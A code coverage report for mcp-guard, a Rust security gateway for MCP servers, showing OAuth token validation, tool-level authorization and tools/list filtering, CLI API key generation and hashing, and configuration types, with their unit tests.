  421|      4|            self.get_userinfo(token).await?
                                                        ^2
  422|       |        };
  423|       |
  424|       |        // Cache the result (cleanup handled automatically in insert)
  425|       |        {
  426|     11|            let mut cache = self.token_cache.write().await;
  427|     11|            cache.insert(token_hash, info.clone());
  428|       |        }
  429|       |
  430|     11|        if !info.active {
  431|      1|            return Err(AuthError::TokenExpired);
  432|     10|        }
  433|       |
  434|       |        // Check expiration
  435|     10|        if let Some(exp) = info.expires_at {
                                  ^1
  436|      1|            let now = std::time::SystemTime::now()
  437|      1|                .duration_since(std::time::UNIX_EPOCH)
  438|      1|                .map(|d| d.as_secs() as i64)
  439|      1|                .unwrap_or(0); // If system clock is before 1970, treat as epoch (safe fallback)
  440|      1|            if now > exp {
  441|      1|                return Err(AuthError::TokenExpired);
  442|      0|            }
  443|      9|        }
  444|       |
  445|      9|        Ok(info)
  446|     15|    }
  447|       |}
  448|       |
  449|       |#[async_trait]
  450|       |impl AuthProvider for OAuthAuthProvider {
  451|     15|    async fn authenticate(&self, token: &str) -> Result<Identity, AuthError> {
  452|       |        let info = self.validate_token(token).await?;
  453|       |
  454|       |        let user_id = info
  455|       |            .user_id
  456|      0|            .ok_or_else(|| AuthError::OAuth("No user ID in token info".into()))?;
  457|       |
  458|       |        let allowed_tools = map_scopes_to_tools(&info.scopes, &self.config.scope_tool_mapping);
  459|       |
  460|       |        Ok(Identity {
  461|       |            id: user_id,
  462|       |            name: info.username,
  463|       |            allowed_tools,
  464|       |            rate_limit: None,
  465|       |            claims: info.claims,
  466|       |        })
  467|     15|    }
  468|       |
  469|      2|    fn name(&self) -> &str {
  470|      2|        "oauth"
  471|      2|    }
  472|       |}
  473|       |
  474|       |#[cfg(test)]
  475|       |mod tests {
  476|       |    use super::*;
  477|       |
  478|      7|    fn create_test_config() -> OAuthConfig {
  479|      7|        OAuthConfig {
  480|      7|            provider: OAuthProviderType::GitHub,
  481|      7|            client_id: "test-client-id".to_string(),
  482|      7|            client_secret: Some("test-secret".to_string()),
  483|      7|            authorization_url: None,
  484|      7|            token_url: None,
  485|      7|            introspection_url: None,
  486|      7|            userinfo_url: None,
  487|      7|            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
  488|      7|            scopes: vec!["read:user".to_string()],
  489|      7|            user_id_claim: "sub".to_string(),
  490|      7|            scope_tool_mapping: HashMap::new(),
  491|      7|        }
  492|      7|    }
  493|       |
  494|       |    #[test]
  495|      1|    fn test_provider_creation() {
  496|      1|        let config = create_test_config();
  497|      1|        let provider = OAuthAuthProvider::new(config).unwrap();
  498|      1|        assert_eq!(provider.name(), "oauth");
  499|      1|    }
  500|       |
  501|       |    #[test]
  502|      1|    fn test_github_endpoints() {
  503|      1|        let config = create_test_config();
  504|      1|        let provider = OAuthAuthProvider::new(config).unwrap();
  505|      1|        assert_eq!(
  506|       |            provider.authorization_url,
  507|       |            "https://github.com/login/oauth/authorize"
  508|       |        );
  509|      1|        assert_eq!(
  510|       |            provider.token_url,
  511|       |            "https://github.com/login/oauth/access_token"
  512|       |        );
  513|      1|        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
  514|      1|    }
  515|       |
  516|       |    #[test]
  517|      1|    fn test_authorization_url_generation() {
  518|      1|        let config = create_test_config();
  519|      1|        let provider = OAuthAuthProvider::new(config).unwrap();
  520|       |
  521|      1|        let url = provider.get_authorization_url("test-state", None);
  522|      1|        assert!(url.contains("response_type=code"));
  523|      1|        assert!(url.contains("client_id=test-client-id"));
  524|      1|        assert!(url.contains("state=test-state"));
  525|      1|    }
  526|       |
  527|       |    #[test]
  528|      1|    fn test_authorization_url_with_pkce() {
  529|      1|        let config = create_test_config();
  530|      1|        let provider = OAuthAuthProvider::new(config).unwrap();
  531|       |
  532|      1|        let url = provider.get_authorization_url("test-state", Some("test-challenge"));
  533|      1|        assert!(url.contains("code_challenge=test-challenge"));
  534|      1|        assert!(url.contains("code_challenge_method=S256"));
  535|      1|    }
  536|       |
  537|       |    #[test]
  538|      1|    fn test_custom_provider_requires_urls() {
  539|      1|        let config = OAuthConfig {
  540|      1|            provider: OAuthProviderType::Custom,
  541|      1|            client_id: "test".to_string(),
  542|      1|            client_secret: None,
  543|      1|            authorization_url: None, // Missing required URL
  544|      1|            token_url: None,
  545|      1|            introspection_url: None,
  546|      1|            userinfo_url: None,
  547|      1|            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
  548|      1|            scopes: vec![],
  549|      1|            user_id_claim: "sub".to_string(),
  550|      1|            scope_tool_mapping: HashMap::new(),
  551|      1|        };
  552|       |
  553|      1|        let result = OAuthAuthProvider::new(config);
  554|      1|        assert!(result.is_err());
  555|      1|    }
  556|       |
  557|       |    #[test]
  558|      1|    fn test_parse_token_info_introspection() {
  559|      1|        let config = create_test_config();
  560|      1|        let provider = OAuthAuthProvider::new(config).unwrap();
  561|       |
  562|      1|        let body = serde_json::json!({
  563|      1|            "active": true,
  564|      1|            "sub": "user123",
  565|      1|            "username": "testuser",
  566|      1|            "scope": "read:user repo"
  567|       |        });
  568|       |
  569|      1|        let info = provider.parse_token_info(&body).unwrap();
  570|      1|        assert!(info.active);
  571|      1|        assert_eq!(info.user_id, Some("user123".to_string()));
  572|      1|        assert_eq!(info.username, Some("testuser".to_string()));
  573|      1|        assert_eq!(info.scopes, vec!["read:user".to_string(), "repo".to_string()]);
  574|      1|    }
  575|       |
  576|       |    #[test]
  577|      1|    fn test_parse_token_info_github_userinfo() {
  578|      1|        let config = create_test_config();
  579|      1|        let provider = OAuthAuthProvider::new(config).unwrap();
  580|       |
  581|      1|        let body = serde_json::json!({
  582|      1|            "id": 12345,
  583|      1|            "login": "octocat",
  584|      1|            "name": "The Octocat"
  585|       |        });
  586|       |
  587|      1|        let info = provider.parse_token_info(&body).unwrap();
  588|      1|        assert_eq!(info.user_id, Some("12345".to_string()));
  589|      1|        assert_eq!(info.username, Some("The Octocat".to_string()));
  590|      1|    }
  591|       |
  592|       |    #[test]
  593|      1|    fn test_parse_token_info_inactive() {
  594|      1|        let config = create_test_config();
  595|      1|        let provider = OAuthAuthProvider::new(config).unwrap();
  596|       |
  597|      1|        let body = serde_json::json!({
  598|      1|            "active": false
  599|       |        });
  600|       |
  601|      1|        let info = provider.parse_token_info(&body).unwrap();
  602|      1|        assert!(!info.active);
  603|      1|    }
  604|       |
  605|       |    #[test]
  606|      1|    fn test_scope_to_tool_mapping() {
  607|      1|        let mut scope_mapping = HashMap::new();
  608|      1|        scope_mapping.insert("read:files".to_string(), vec!["read_file".to_string()]);
  609|      1|        scope_mapping.insert("write:files".to_string(), vec!["write_file".to_string()]);
  610|       |
  611|      1|        let tools = map_scopes_to_tools(
  612|      1|            &["read:files".to_string(), "write:files".to_string()],
  613|      1|            &scope_mapping,
  614|       |        );
  615|      1|        assert!(tools.is_some());
  616|      1|        let tools = tools.unwrap();
  617|      1|        assert!(tools.contains(&"read_file".to_string()));
  618|      1|        assert!(tools.contains(&"write_file".to_string()));
  619|      1|    }
  620|       |
  621|       |    #[test]
  622|      1|    fn test_scope_to_tool_mapping_wildcard() {
  623|      1|        let mut scope_mapping = HashMap::new();
  624|      1|        scope_mapping.insert("admin".to_string(), vec!["*".to_string()]);
  625|       |
  626|       |        // Wildcard should return None (all tools allowed)
  627|      1|        let tools = map_scopes_to_tools(&["admin".to_string()], &scope_mapping);
  628|      1|        assert!(tools.is_none());
  629|      1|    }
  630|       |
  631|       |    #[test]
  632|      1|    fn test_token_hash() {
  633|      1|        let hash1 = OAuthAuthProvider::hash_token("test-token-1");
  634|      1|        let hash2 = OAuthAuthProvider::hash_token("test-token-2");
  635|      1|        let hash1_again = OAuthAuthProvider::hash_token("test-token-1");
  636|       |
  637|      1|        assert_ne!(hash1, hash2);
  638|      1|        assert_eq!(hash1, hash1_again);
  639|      1|    }
  640|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/authz/mod.rs:
    1|       |//! Authorization logic for mcp-guard
    2|       |//!
    3|       |//! This module implements tool-level authorization for MCP requests.
    4|       |//!
    5|       |//! Authorization model:
    6|       |//! - Each identity can have an optional `allowed_tools` list
    7|       |//! - `None` = unrestricted access to all tools
    8|       |//! - `Some(["*"])` = wildcard, equivalent to unrestricted
    9|       |//! - `Some(["tool1", "tool2"])` = only these specific tools
   10|       |//!
   11|       |//! Key functions:
   12|       |//! - [`authorize_tool_call`] - Check if identity can call a specific tool
   13|       |//! - [`filter_tools_list_response`] - Filter `tools/list` to show only authorized tools (FR-AUTHZ-03)
   14|       |
   15|       |use crate::auth::Identity;
   16|       |use crate::transport::Message;
   17|       |use serde_json::Value;
   18|       |
   19|       |// ============================================================================
   20|       |// Authorization Functions
   21|       |// ============================================================================
   22|       |
   23|       |/// Check if an identity is authorized to call a specific tool
   24|     20|pub fn authorize_tool_call(identity: &Identity, tool_name: &str) -> bool {
   25|     20|    match &identity.allowed_tools {
   26|      2|        None => true, // No restrictions
   27|     28|        Some(tools) => tools.iter().any(|t| t == tool_name || t == "*"),
                           ^18       ^18          ^18                       ^19
   28|       |    }
   29|     20|}
   30|       |
   31|       |/// Extract tool name from a MCP request message
   32|      0|pub fn extract_tool_name(message: &Message) -> Option<&str> {
   33|      0|    if let Some(method) = &message.method {
   34|      0|        if method == "tools/call" {
   35|      0|            if let Some(params) = &message.params {
   36|      0|                return params.get("name").and_then(|v| v.as_str());
   37|      0|            }
   38|      0|        }
   39|      0|    }
   40|      0|    None
   41|      0|}
   42|       |
   43|       |// ============================================================================
   44|       |// Types
   45|       |// ============================================================================
   46|       |
   47|       |/// Authorization decision
   48|       |#[derive(Debug, Clone)]
   49|       |pub enum AuthzDecision {
   50|       |    Allow,
   51|       |    Deny(String),
   52|       |}
   53|       |
   54|       |/// Authorize a request based on identity and message
   55|      0|pub fn authorize_request(identity: &Identity, message: &Message) -> AuthzDecision {
   56|       |    // Check tool-level authorization for tool calls
   57|      0|    if let Some(tool_name) = extract_tool_name(message) {
   58|      0|        if !authorize_tool_call(identity, tool_name) {
   59|      0|            return AuthzDecision::Deny(format!(
   60|      0|                "Identity '{}' is not authorized to call tool '{}'",
   61|      0|                identity.id, tool_name
   62|      0|            ));
   63|      0|        }
   64|      0|    }
   65|       |
   66|      0|    AuthzDecision::Allow
   67|      0|}
   68|       |
   69|       |// ============================================================================
   70|       |// Helper Functions
   71|       |// ============================================================================
   72|       |
   73|       |/// Check if a request is a tools/list request
   74|      5|pub fn is_tools_list_request(message: &Message) -> bool {
   75|      5|    message.method.as_deref() == Some("tools/list")
   76|      5|}
   77|       |
   78|       |/// Filter a tools/list response to only include tools the identity is authorized to call (FR-AUTHZ-03)
   79|       |///
   80|       |/// The tools/list response has this structure:
   81|       |/// ```json
   82|       |/// {
   83|       |///   "jsonrpc": "2.0",
   84|       |///   "id": 1,
   85|       |///   "result": {
   86|       |///     "tools": [
   87|       |///       { "name": "read_file", "description": "...", "inputSchema": {...} },
   88|       |///       { "name": "write_file", "description": "...", "inputSchema": {...} }
   89|       |///     ]
   90|       |///   }
   91|       |/// }
   92|       |/// ```
   93|       |///
   94|       |/// This function filters the tools array to only include tools the identity can call.
   95|      6|pub fn filter_tools_list_response(mut response: Message, identity: &Identity) -> Message {
   96|       |    // If identity has unrestricted access, return as-is
   97|      6|    if identity.allowed_tools.is_none() {
   98|      2|        return response;
   99|      4|    }
  100|       |
  101|       |    // If identity has wildcard access, return as-is
  102|      4|    if let Some(tools) = &identity.allowed_tools {
  103|      6|        if tools.iter().any(|t| t == "*") {
                         ^4           ^4
  104|      1|            return response;
  105|      3|        }
  106|      0|    }
  107|       |
  108|       |    // Try to filter the tools array in the result
  109|      3|    if let Some(ref mut result) = response.result {
  110|      3|        if let Some(tools) = result.get_mut("tools") {
  111|      3|            if let Some(tools_array) = tools.as_array() {
  112|      3|                let filtered: Vec<Value> = tools_array
  113|      3|                    .iter()
  114|     10|                    .filter(|tool| {
                                   ^3
  115|     10|                        if let Some(name) = tool.get("name").and_then(|n| n.as_str()) {
  116|     10|                            authorize_tool_call(identity, name)
  117|       |                        } else {
  118|      0|                            false
  119|       |                        }
  120|     10|                    })
  121|      3|                    .cloned()
  122|      3|                    .collect();
  123|       |
  124|      3|                *tools = Value::Array(filtered);
  125|      0|            }
  126|      0|        }
  127|      0|    }
  128|       |
  129|      3|    response
  130|      6|}
  131|       |
  132|       |#[cfg(test)]
  133|       |mod tests {
  134|       |    //! Unit tests for authorization logic.
  135|       |    //!
  136|       |    //! Tests cover:
  137|       |    //! - Unrestricted access (allowed_tools = None)
  138|       |    //! - Restricted access to specific tools
  139|       |    //! - Wildcard tool permissions
  140|       |    //! - tools/list response filtering (FR-AUTHZ-03)
  141|       |
  142|       |    use super::*;
  143|       |
  144|       |    /// Verify unrestricted identity can call any tool
  145|       |    #[test]
  146|      1|    fn test_authorize_tool_unrestricted() {
  147|      1|        let identity = Identity {
  148|      1|            id: "test".to_string(),
  149|      1|            name: None,
  150|      1|            allowed_tools: None,
  151|      1|            rate_limit: None,
  152|      1|            claims: std::collections::HashMap::new(),
  153|      1|        };
  154|       |
  155|      1|        assert!(authorize_tool_call(&identity, "any_tool"));
  156|      1|    }
  157|       |
  158|       |    /// Verify restricted identity can only call allowed tools
  159|       |    #[test]
  160|      1|    fn test_authorize_tool_restricted() {
  161|      1|        let identity = Identity {
  162|      1|            id: "test".to_string(),
  163|      1|            name: None,
  164|      1|            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
  165|      1|            rate_limit: None,
  166|      1|            claims: std::collections::HashMap::new(),
  167|      1|        };
  168|       |
  169|      1|        assert!(authorize_tool_call(&identity, "read"));
  170|      1|        assert!(authorize_tool_call(&identity, "list"));
  171|      1|        assert!(!authorize_tool_call(&identity, "write"));
  172|      1|    }
  173|       |
  174|       |    /// Verify wildcard "*" grants access to all tools
  175|       |    #[test]
  176|      1|    fn test_authorize_tool_wildcard() {
  177|      1|        let identity = Identity {
  178|      1|            id: "test".to_string(),
  179|      1|            name: None,
  180|      1|            allowed_tools: Some(vec!["*".to_string()]),
  181|      1|            rate_limit: None,
  182|      1|            claims: std::collections::HashMap::new(),
  183|      1|        };
  184|       |
  185|      1|        assert!(authorize_tool_call(&identity, "any_tool"));
  186|      1|    }
  187|       |
  188|       |    /// Verify tools/list request detection
  189|       |    #[test]
  190|      1|    fn test_is_tools_list_request() {
  191|      1|        let request = Message {
  192|      1|            jsonrpc: "2.0".to_string(),
  193|      1|            id: Some(serde_json::json!(1)),
  194|      1|            method: Some("tools/list".to_string()),
  195|      1|            params: None,
  196|      1|            result: None,
  197|      1|            error: None,
  198|      1|        };
  199|      1|        assert!(is_tools_list_request(&request));
  200|       |
  201|      1|        let other_request = Message {
  202|      1|            jsonrpc: "2.0".to_string(),
  203|      1|            id: Some(serde_json::json!(1)),
  204|      1|            method: Some("tools/call".to_string()),
  205|      1|            params: None,
  206|      1|            result: None,
  207|      1|            error: None,
  208|      1|        };
  209|      1|        assert!(!is_tools_list_request(&other_request));
  210|      1|    }
  211|       |
  212|       |    /// Verify unrestricted identity sees all tools in list response
  213|       |    #[test]
  214|      1|    fn test_filter_tools_list_unrestricted() {
  215|      1|        let identity = Identity {
  216|      1|            id: "test".to_string(),
  217|      1|            name: None,
  218|      1|            allowed_tools: None,
  219|      1|            rate_limit: None,
  220|      1|            claims: std::collections::HashMap::new(),
  221|      1|        };
  222|       |
  223|      1|        let response = Message {
  224|      1|            jsonrpc: "2.0".to_string(),
  225|      1|            id: Some(serde_json::json!(1)),
  226|      1|            method: None,
  227|      1|            params: None,
  228|      1|            result: Some(serde_json::json!({
  229|      1|                "tools": [
  230|      1|                    {"name": "read_file", "description": "Read a file"},
  231|      1|                    {"name": "write_file", "description": "Write a file"}
  232|      1|                ]
  233|      1|            })),
  234|      1|            error: None,
  235|      1|        };
  236|       |
  237|      1|        let filtered = filter_tools_list_response(response, &identity);
  238|      1|        let result = filtered.result.unwrap();
  239|      1|        let tools = result["tools"].as_array().unwrap();
  240|      1|        assert_eq!(tools.len(), 2);
  241|      1|    }
  242|       |
  243|       |    /// Verify restricted identity only sees allowed tools in list response (FR-AUTHZ-03)
  244|       |    #[test]
  245|      1|    fn test_filter_tools_list_restricted() {
  246|      1|        let identity = Identity {
  247|      1|            id: "test".to_string(),
  248|      1|            name: None,
  249|      1|            allowed_tools: Some(vec!["read_file".to_string()]),
  250|      1|            rate_limit: None,
  251|      1|            claims: std::collections::HashMap::new(),
  252|      1|        };
  253|       |
  254|      1|        let response = Message {
  255|      1|            jsonrpc: "2.0".to_string(),
  256|      1|            id: Some(serde_json::json!(1)),
  257|      1|            method: None,
  258|      1|            params: None,
  259|      1|            result: Some(serde_json::json!({
  260|      1|                "tools": [
  261|      1|                    {"name": "read_file", "description": "Read a file"},
  262|      1|                    {"name": "write_file", "description": "Write a file"},
  263|      1|                    {"name": "delete_file", "description": "Delete a file"}
  264|      1|                ]
  265|      1|            })),
  266|      1|            error: None,
  267|      1|        };
  268|       |
  269|      1|        let filtered = filter_tools_list_response(response, &identity);
  270|      1|        let result = filtered.result.unwrap();
  271|      1|        let tools = result["tools"].as_array().unwrap();
  272|      1|        assert_eq!(tools.len(), 1);
  273|      1|        assert_eq!(tools[0]["name"], "read_file");
  274|      1|    }
  275|       |
  276|       |    #[test]
  277|      1|    fn test_filter_tools_list_wildcard() {
  278|      1|        let identity = Identity {
  279|      1|            id: "test".to_string(),
  280|      1|            name: None,
  281|      1|            allowed_tools: Some(vec!["*".to_string()]),
  282|      1|            rate_limit: None,
  283|      1|            claims: std::collections::HashMap::new(),
  284|      1|        };
  285|       |
  286|      1|        let response = Message {
  287|      1|            jsonrpc: "2.0".to_string(),
  288|      1|            id: Some(serde_json::json!(1)),
  289|      1|            method: None,
  290|      1|            params: None,
  291|      1|            result: Some(serde_json::json!({
  292|      1|                "tools": [
  293|      1|                    {"name": "read_file", "description": "Read a file"},
  294|      1|                    {"name": "write_file", "description": "Write a file"}
  295|      1|                ]
  296|      1|            })),
  297|      1|            error: None,
  298|      1|        };
  299|       |
  300|      1|        let filtered = filter_tools_list_response(response, &identity);
  301|      1|        let result = filtered.result.unwrap();
  302|      1|        let tools = result["tools"].as_array().unwrap();
  303|      1|        assert_eq!(tools.len(), 2);
  304|      1|    }
  305|       |
  306|       |    #[test]
  307|      1|    fn test_filter_tools_list_multiple_allowed() {
  308|      1|        let identity = Identity {
  309|      1|            id: "test".to_string(),
  310|      1|            name: None,
  311|      1|            allowed_tools: Some(vec!["read_file".to_string(), "list_files".to_string()]),
  312|      1|            rate_limit: None,
  313|      1|            claims: std::collections::HashMap::new(),
  314|      1|        };
  315|       |
  316|      1|        let response = Message {
  317|      1|            jsonrpc: "2.0".to_string(),
  318|      1|            id: Some(serde_json::json!(1)),
  319|      1|            method: None,
  320|      1|            params: None,
  321|      1|            result: Some(serde_json::json!({
  322|      1|                "tools": [
  323|      1|                    {"name": "read_file", "description": "Read a file"},
  324|      1|                    {"name": "write_file", "description": "Write a file"},
  325|      1|                    {"name": "list_files", "description": "List files"}
  326|      1|                ]
  327|      1|            })),
  328|      1|            error: None,
  329|      1|        };
  330|       |
  331|      1|        let filtered = filter_tools_list_response(response, &identity);
  332|      1|        let result = filtered.result.unwrap();
  333|      1|        let tools = result["tools"].as_array().unwrap();
  334|      1|        assert_eq!(tools.len(), 2);
  335|       |
  336|      1|        let names: Vec<&str> = tools.iter()
  337|      2|            .filter_map(|t| t["name"].as_str())
                           ^1
  338|      1|            .collect();
  339|      1|        assert!(names.contains(&"read_file"));
  340|      1|        assert!(names.contains(&"list_files"));
  341|      1|        assert!(!names.contains(&"write_file"));
  342|      1|    }
  343|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/cli/mod.rs:
    1|       |//! CLI commands for mcp-guard
    2|       |//!
    3|       |//! This module provides the command-line interface for mcp-guard.
    4|       |//!
    5|       |//! Available commands:
    6|       |//! - `init` - Generate a new configuration file (TOML or YAML)
    7|       |//! - `validate` - Validate configuration file syntax and semantics
    8|       |//! - `keygen` - Generate a new API key with its hash for configuration
    9|       |//! - `hash-key` - Hash an existing API key for configuration
   10|       |//! - `run` - Start the MCP Guard server
   11|       |//! - `version` - Show version and build information
   12|       |//! - `check-upstream` - Test upstream MCP server connectivity
   13|       |//!
   14|       |//! # Example
   15|       |//!
   16|       |//! ```bash
   17|       |//! # Generate config and start server
   18|       |//! mcp-guard init
   19|       |//! mcp-guard validate
   20|       |//! mcp-guard run
   21|       |//! ```
   22|       |
   23|       |use clap::{Parser, Subcommand};
   24|       |use std::path::PathBuf;
   25|       |
   26|       |// ============================================================================
   27|       |// CLI Definition
   28|       |// ============================================================================
   29|       |
   30|       |/// MCP Guard - Security gateway for MCP servers
   31|       |#[derive(Debug, Parser)]
   32|       |#[command(name = "mcp-guard")]
   33|       |#[command(author, version, about, long_about = None)]
   34|       |pub struct Cli {
   35|       |    /// Path to configuration file
   36|       |    #[arg(short, long, global = true, default_value = "mcp-guard.toml")]
   37|       |    pub config: PathBuf,
   38|       |
   39|       |    /// Enable verbose logging
   40|       |    #[arg(short, long, global = true)]
   41|       |    pub verbose: bool,
   42|       |
   43|       |    #[command(subcommand)]
   44|       |    pub command: Commands,
   45|       |}
   46|       |
   47|       |#[derive(Debug, Subcommand)]
   48|       |pub enum Commands {
   49|       |    /// Initialize a new configuration file
   50|       |    Init {
   51|       |        /// Output format (toml or yaml)
   52|       |        #[arg(long, default_value = "toml")]
   53|       |        format: String,
   54|       |
   55|       |        /// Force overwrite existing file
   56|       |        #[arg(short = 'f', long)]
   57|       |        force: bool,
   58|       |    },
   59|       |
   60|       |    /// Validate configuration file
   61|       |    Validate,
   62|       |
   63|       |    /// Generate a new API key
   64|       |    Keygen {
   65|       |        /// User/service identifier
   66|       |        #[arg(long)]
   67|       |        user_id: String,
   68|       |
   69|       |        /// Rate limit for this key (requests per second)
   70|       |        #[arg(long)]
   71|       |        rate_limit: Option<u32>,
   72|       |
   73|       |        /// Comma-separated list of allowed tools
   74|       |        #[arg(long)]
   75|       |        tools: Option<String>,
   76|       |    },
   77|       |
   78|       |    /// Run the MCP Guard server
   79|       |    Run {
   80|       |        /// Override listen host
   81|       |        #[arg(long)]
   82|       |        host: Option<String>,
   83|       |
   84|       |        /// Override listen port
   85|       |        #[arg(long)]
   86|       |        port: Option<u16>,
   87|       |    },
   88|       |
   89|       |    /// Hash an API key for configuration
   90|       |    HashKey {
   91|       |        /// The API key to hash
   92|       |        key: String,
   93|       |    },
   94|       |
   95|       |    /// Show version and build information
   96|       |    Version,
   97|       |
   98|       |    /// Check upstream MCP server connectivity
   99|       |    CheckUpstream {
  100|       |        /// Timeout in seconds for the connectivity check
  101|       |        #[arg(short, long, default_value = "10")]
  102|       |        timeout: u64,
  103|       |    },
  104|       |}
  105|       |
  106|       |impl Cli {
  107|       |    /// Parse command-line arguments
  108|     42|    pub fn parse_args() -> Self {
  109|     42|        Self::parse()
  110|     42|    }
  111|       |}
  112|       |
  113|       |// ============================================================================
  114|       |// Helper Functions
  115|       |// ============================================================================
  116|       |
  117|       |/// Generate a new random API key
  118|       |///
  119|       |/// Creates a 32-byte random key encoded as base64url with an "mcp_" prefix.
  120|       |/// Example output: `mcp_AbCdEf123456...`
  121|      8|pub fn generate_api_key() -> String {
  122|       |    use rand::Rng;
  123|      8|    let mut rng = rand::thread_rng();
  124|      8|    let bytes: [u8; 32] = rng.gen();
  125|      8|    format!(
  126|      8|        "mcp_{}",
  127|      8|        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, bytes)
  128|       |    )
  129|      8|}
  130|       |
  131|       |/// Hash an API key for storage
  132|       |///
  133|       |/// Uses SHA-256 and encodes the result as base64. This hash should be stored
  134|       |/// in the configuration file instead of the plaintext key.
  135|     28|pub fn hash_api_key(key: &str) -> String {
  136|       |    use sha2::{Digest, Sha256};
  137|     28|    let mut hasher = Sha256::new();
  138|     28|    hasher.update(key.as_bytes());
  139|     28|    base64::Engine::encode(&base64::engine::general_purpose::STANDARD, hasher.finalize())
  140|     28|}
  141|       |
  142|       |// ============================================================================
  143|       |// Config Generation
  144|       |// ============================================================================
  145|       |
  146|       |/// Generate default configuration
  147|       |///
  148|       |/// Returns a configuration template in either TOML or YAML format.
  149|      5|pub fn generate_config(format: &str) -> String {
  150|      5|    let config = r#"# MCP Guard Configuration
  151|      5|
  152|      5|[server]
  153|      5|host = "127.0.0.1"
  154|      5|port = 3000
  155|      5|
  156|      5|[auth]
  157|      5|# API keys are configured here
  158|      5|# api_keys = [
  159|      5|#   { id = "user1", key_hash = "<hash>", allowed_tools = ["read", "write"] }
  160|      5|# ]
  161|      5|
  162|      5|[rate_limit]
  163|      5|enabled = true
  164|      5|requests_per_second = 100
  165|      5|burst_size = 50
  166|      5|
  167|      5|[audit]
  168|      5|enabled = true
  169|      5|stdout = true
  170|      5|
  171|      5|[upstream]
  172|      5|transport = "stdio"
  173|      5|command = "npx"
  174|      5|args = ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
  175|      5|"#;
  176|       |
  177|      5|    if format == "yaml" {
  178|       |        // Convert to YAML format
  179|      1|        r#"# MCP Guard Configuration
  180|      1|
  181|      1|server:
  182|      1|  host: "127.0.0.1"
  183|      1|  port: 3000
  184|      1|
  185|      1|auth:
  186|      1|  api_keys: []
  187|      1|  # - id: "user1"
  188|      1|  #   key_hash: "<hash>"
  189|      1|  #   allowed_tools:
  190|      1|  #     - read
  191|      1|  #     - write
  192|      1|
  193|      1|rate_limit:
  194|      1|  enabled: true
  195|      1|  requests_per_second: 100
  196|      1|  burst_size: 50
  197|      1|
  198|      1|audit:
  199|      1|  enabled: true
  200|      1|  stdout: true
  201|      1|
  202|      1|upstream:
  203|      1|  transport: stdio
  204|      1|  command: npx
  205|      1|  args:
  206|      1|    - "-y"
  207|      1|    - "@modelcontextprotocol/server-filesystem"
  208|      1|    - "/tmp"
  209|      1|"#
  210|      1|        .to_string()
  211|       |    } else {
  212|      4|        config.to_string()
  213|       |    }
  214|      5|}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/config/mod.rs:
    1|       |//! Configuration types and parsing for mcp-guard
    2|       |//!
    3|       |//! This module provides strongly-typed configuration for all mcp-guard features:
    4|       |//! - Server settings (host, port, TLS)
    5|       |//! - Authentication (API keys, JWT, OAuth 2.1, mTLS)
    6|       |//! - Rate limiting (per-identity token bucket)
    7|       |//! - Audit logging (file, stdout, HTTP export)
    8|       |//! - Tracing (OpenTelemetry/OTLP)
    9|       |//! - Upstream routing (single server or multi-server)
   10|       |//!
   11|       |//! Configuration can be loaded from TOML or YAML files via [`Config::from_file`].
   12|       |
   13|       |use serde::{Deserialize, Serialize};
   14|       |use std::collections::HashMap;
   15|       |use std::path::PathBuf;
   16|       |
   17|       |// ============================================================================
   18|       |// Error Types
   19|       |// ============================================================================
   20|       |
   21|       |/// Configuration error type
   22|       |#[derive(Debug, thiserror::Error)]
   23|       |pub enum ConfigError {
   24|       |    #[error("Failed to read config file: {0}")]
   25|       |    Read(#[from] std::io::Error),
   26|       |
   27|       |    #[error("Failed to parse config: {0}")]
   28|       |    Parse(String),
   29|       |
   30|       |    #[error("Validation error: {0}")]
   31|       |    Validation(String),
   32|       |}
   33|       |
   34|       |// ============================================================================
   35|       |// Core Configuration
   36|       |// ============================================================================
   37|       |
   38|       |/// Main configuration struct
   39|       |#[derive(Debug, Clone, Serialize, Deserialize)]
   40|       |pub struct Config {
   41|       |    /// Server configuration
   42|       |    #[serde(default)]
   43|       |    pub server: ServerConfig,
   44|       |
   45|       |    /// Authentication configuration
   46|       |    #[serde(default)]
   47|       |    pub auth: AuthConfig,
   48|       |
   49|       |    /// Rate limiting configuration
   50|       |    #[serde(default)]
   51|       |    pub rate_limit: RateLimitConfig,
   52|       |
   53|       |    /// Audit logging configuration
   54|       |    #[serde(default)]
   55|       |    pub audit: AuditConfig,
   56|       |
   57|       |    /// OpenTelemetry tracing configuration
   58|       |    #[serde(default)]
   59|       |    pub tracing: TracingConfig,
   60|       |
   61|       |    /// Upstream MCP server configuration
   62|       |    pub upstream: UpstreamConfig,
   63|       |}
   64|       |
   65|       |/// Server configuration
   66|       |#[derive(Debug, Clone, Serialize, Deserialize)]
   67|       |pub struct ServerConfig {
   68|       |    /// Host to bind to
   69|       |    #[serde(default = "default_host")]
   70|       |    pub host: String,
   71|       |
   72|       |    /// Port to listen on
   73|       |    #[serde(default = "default_port")]
   74|       |    pub port: u16,
   75|       |
   76|       |    /// Enable TLS
   77|       |    #[serde(default)]
   78|       |    pub tls: Option<TlsConfig>,
   79|       |}
   80|       |
   81|       |impl Default for ServerConfig {
   82|     42|    fn default() -> Self {
   83|     42|        Self {
   84|     42|            host: default_host(),
   85|     42|            port: default_port(),
   86|     42|            tls: None,
   87|     42|        }
   88|     42|    }
   89|       |}
   90|       |
   91|     42|fn default_host() -> String {
   92|     42|    "127.0.0.1".to_string()
   93|     42|}
   94|       |
   95|     43|fn default_port() -> u16 {
   96|     43|    3000
   97|     43|}
   98|       |
   99|       |/// TLS configuration
  100|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  101|       |pub struct TlsConfig {
  102|       |    /// Path to server certificate (PEM format)
  103|       |    pub cert_path: PathBuf,
  104|       |    /// Path to server private key (PEM format)
  105|       |    pub key_path: PathBuf,
  106|       |    /// Path to CA certificate for client certificate validation (mTLS)
  107|       |    /// If set, client certificates will be required and validated against this CA
  108|       |    pub client_ca_path: Option<PathBuf>,
  109|       |}
  110|       |
  111|       |/// mTLS authentication configuration
  112|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  113|       |pub struct MtlsConfig {
  114|       |    /// Whether to enable mTLS authentication
  115|       |    #[serde(default)]
  116|       |    pub enabled: bool,
